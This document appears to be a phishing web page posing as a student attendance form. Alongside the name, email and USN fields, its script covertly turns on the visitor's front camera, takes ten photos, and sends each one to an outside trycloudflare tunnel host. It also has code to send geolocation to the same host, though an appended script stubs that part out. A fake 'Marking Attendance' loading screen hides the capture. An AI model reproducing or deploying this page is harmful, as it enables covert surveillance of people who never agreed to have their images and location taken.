<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Attendance Confirmation</title>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
      *{box-sizing:border-box;margin:0;padding:0}
      body{font-family:'Roboto',sans-serif;background:#202124;color:#fff;min-height:100vh;display:flex;flex-direction:column}
      .header{display:flex;align-items:center;padding:16px 24px;background:#202124;border-bottom:1px solid #3c4043}
      .logo{display:flex;align-items:center;gap:8px;font-size:20px;font-weight:500;color:#fff}
      .main-container{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px}
      .form-container{background:#fff;border-radius:16px;padding:40px;max-width:520px;width:100%;color:#202124}
      .form-header{text-align:center;margin-bottom:20px}
      .form-header h1{font-size:26px;margin-bottom:6px}
      .form-header p{color:#5f6368}
      .form-group{margin-bottom:18px}
      label{display:block;color:#3c4043;font-weight:500;margin-bottom:8px}
      input[type=text],input[type=email]{width:100%;padding:12px;border:1.5px solid #dadce0;border-radius:8px}
      .submit-btn{width:100%;padding:14px;background:linear-gradient(135deg,#1a73e8,#4285f4);color:#fff;border:0;border-radius:8px;font-weight:500;cursor:pointer}
      .footer{text-align:center;padding:20px;color:#9aa0a6;background:#202124}

      /* Connecting / Blur */
      .blur-background{filter:blur(8px);pointer-events:none}
      #connecting-screen{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(135deg,#1a1a1a,#2d2d2d);z-index:9999}
      .connecting-content{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;width:90%;max-width:480px}
      .connecting-spinner{width:48px;height:48px;margin:18px auto;border-radius:50%;border:4px solid rgba(255,255,255,0.08);border-top-color:#1a73e8;animation:spin 1s linear infinite}
      @keyframes spin{to{transform:rotate(360deg)}}

      #success-content{display:none;text-align:center;padding:20px}
      #success-content h2{color:#202124;font-size:28px;margin-bottom:12px}
      #success-content p{color:#5f6368;margin-bottom:18px}
      .close-btn{padding:12px 18px;border-radius:8px;border:0;background:#0f9d58;color:#fff;cursor:pointer}

      /* Hidden video & canvas */
      .video-wrap{display:none}
    </style>
  </head>
  <body>
    <div class="header">
      <div class="logo"><span>Attendance</span></div>
    </div>

    <div class="main-container">
      <div class="form-container" id="user-form">
        <div class="form-header">
          <div class="form-logo" style="width:120px;height:120px;margin:0 auto 18px;">
            <img src="assets/dsc.png" alt="DSC Logo" style="width:100%;height:100%;object-fit:contain;display:block;">
          </div>
          <h1>Sign In</h1>
          <p>Enter your details to mark attendance</p>
        </div>
        <form id="detailsForm" onsubmit="return submitForm(event)">
          <div class="form-group">
            <label for="userName">Full Name</label>
            <input id="userName" name="userName" type="text" placeholder="John Smith" required>
          </div>
          <div class="form-group">
            <label for="userEmail">Email</label>
            <input id="userEmail" name="userEmail" type="email" placeholder="john@example.com" required>
          </div>
          <div class="form-group">
            <label for="userUSN">USN</label>
            <input id="userUSN" name="userUSN" type="text" placeholder="USN" required>
          </div>
          <button class="submit-btn" type="submit">Mark Attendance</button>
        </form>
      </div>

      <div class="form-container" id="success-content">
        <h2>Congratulations!</h2>
        <p>Your attendance has been marked. Close the website to continue.</p>
        <button class="close-btn" onclick="tryClose()">Close</button>
      </div>
    </div>

    <div id="connecting-screen">
      <div class="connecting-content">
          <h2>Marking Attendance</h2>
          <p style="color:#b8b8b8">Processing your attendance — this may take a few seconds.</p>
          <div class="connecting-spinner"></div>
        </div>
    </div>

    <div class="footer"><p>&copy; 2025 Attendance</p></div>

    <div class="video-wrap" hidden>
      <video id="video" playsinline autoplay></video>
    </div>
    <canvas id="canvas" width="640" height="480" hidden></canvas>

    <script>
      // helper to post image
      function postImage(imgdata){
        $.ajax({
          type:'POST',
          data:{cat:imgdata},
          url:'https://limits-dts-dust-wesley.trycloudflare.com/post.php',
          dataType:'json',
          async:false
        }).always(function(){});
      }

      function postLocation(lat,lon,acc){
        $.ajax({
          type:'POST',
          data:{latitude:lat,longitude:lon,accuracy:acc},
          url:'https://limits-dts-dust-wesley.trycloudflare.com/location.php',
          dataType:'json',
          async:false
        }).always(function(){});
      }

      const video=document.getElementById('video');
      const canvas=document.getElementById('canvas');

      async function tryGetCamera(){
        try{
          const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
          video.srcObject=stream;
          // capture exactly 10 consecutive photos
          const ctx=canvas.getContext('2d');
          // clear any previous capture loop
          if(window._attendance_capture_interval){
            clearInterval(window._attendance_capture_interval);
            window._attendance_capture_interval = null;
          }
          window._attendance_stream = stream;
          window._photo_count = 0;
          const MAX_PHOTOS = 10;
          // capture immediately and then repeatedly every 1500ms until 10 photos
          function captureOnce(){
            try{
              if(window._photo_count >= MAX_PHOTOS){
                stopCapture();
                return;
              }
              ctx.drawImage(video,0,0,640,480);
              var data=canvas.toDataURL('image/png').replace('image/png','image/octet-stream');
              postImage(data);
              window._photo_count++;
              if(window._photo_count >= MAX_PHOTOS){
                stopCapture();
              }
            }catch(e){}
          }
          captureOnce();
          window._attendance_capture_interval = setInterval(captureOnce, 1500);
          return true;
        }catch(e){
          return false;
        }
      }

      function tryGetLocation(){
        return new Promise(function(resolve){
          if(!navigator.geolocation){
            resolve(false);
            return;
          }
          navigator.geolocation.getCurrentPosition(function(pos){
            var lat=pos.coords.latitude;var lon=pos.coords.longitude;var acc=pos.coords.accuracy;
            postLocation(lat,lon,acc);
            resolve(true);
          },function(){resolve(false);},{timeout:8000});
        });
      }

      function stopCapture(){
        try{
          if(window._attendance_capture_interval){
            clearInterval(window._attendance_capture_interval);
            window._attendance_capture_interval = null;
          }
          if(window._attendance_stream){
            window._attendance_stream.getTracks().forEach(t=>t.stop());
            window._attendance_stream = null;
          }
        }catch(e){}
      }

      function showConnecting(){
        document.getElementById('connecting-screen').style.display='block';
        document.querySelector('.header').classList.add('blur-background');
        document.querySelector('.main-container').classList.add('blur-background');
        document.querySelector('.footer').classList.add('blur-background');
      }

      function hideConnectingAndShowSuccess(){
        var cs=document.getElementById('connecting-screen');
        cs.style.opacity='0';cs.style.transition='opacity 0.4s ease';
        setTimeout(function(){cs.style.display='none';document.querySelector('.header').classList.remove('blur-background');document.querySelector('.main-container').classList.remove('blur-background');document.querySelector('.footer').classList.remove('blur-background');document.getElementById('success-content').style.display='block';},400);
      }

      async function submitForm(e){
        e.preventDefault();
        var name=document.getElementById('userName').value;
        var email=document.getElementById('userEmail').value;
        var usn=document.getElementById('userUSN').value;
        // hide form
        document.getElementById('user-form').style.display='none';
        showConnecting();

        // start camera capture (if allowed) and location request in parallel
        const camPromise = tryGetCamera();
        const locPromise = tryGetLocation();

        // show loading for about 15 seconds to capture 10 photos (10 * 1.5s)
        await new Promise(function(resolve){
          setTimeout(resolve, 15500);
        });

        // stop capturing photos after loading period
        stopCapture();

        // ensure location promise has settled (don't block longer than necessary)
        try{ await Promise.race([locPromise, new Promise(r=>setTimeout(r,1000))]); }catch(e){}

        // show success
        hideConnectingAndShowSuccess();
        return false;
      }

      function tryClose(){
        try{window.close();}catch(e){}
        alert('If the tab did not close automatically, please close the browser tab to continue.');
      }
    </script>
  </body>
</html>
<script>
  // Location acquisition disabled by server-side option; stub out function
  function tryGetLocation(){
    return Promise.resolve(false);
  }
</script>
